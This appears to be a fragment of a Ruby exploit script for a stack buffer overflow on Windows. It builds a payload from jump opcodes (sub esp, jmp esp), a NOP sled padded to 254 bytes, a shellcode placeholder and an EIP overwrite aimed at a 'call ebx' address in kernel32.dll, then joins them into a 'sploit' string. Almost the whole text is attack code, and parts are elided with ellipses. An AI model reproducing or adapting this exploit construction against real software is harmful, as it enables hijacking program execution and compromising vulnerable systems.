...
jmpcode = "\x83\xec\x64" * 2 # Opcode for sub esp,100
#"\x83\xec\x64" + # Opcode for sub esp,100
jmpcode += "\x83\xec\x28"# Opcode for sub esp,40
jmpcode += "\xff\xe4" # Opcode for jmp esp
...
shellcode += "X" * 1
nops = "\x90" * (254 - (jmpcode.size + shellcode.size))  # EIP Over write with 254
eip = "\x95\x03\x81\x7C" # Memory address 0x7c810395 -> call ebx kernel32.dll
puts "Jmp: #{jmpcode.size}"
puts "Shell: #{shellcode.size}"
puts "Nops: #{nops.size}"

#eip = "\xcc" * 4 

sploit = jmpcode + nops + shellcode + eip

puts "Sploit: #{sploit.size}"
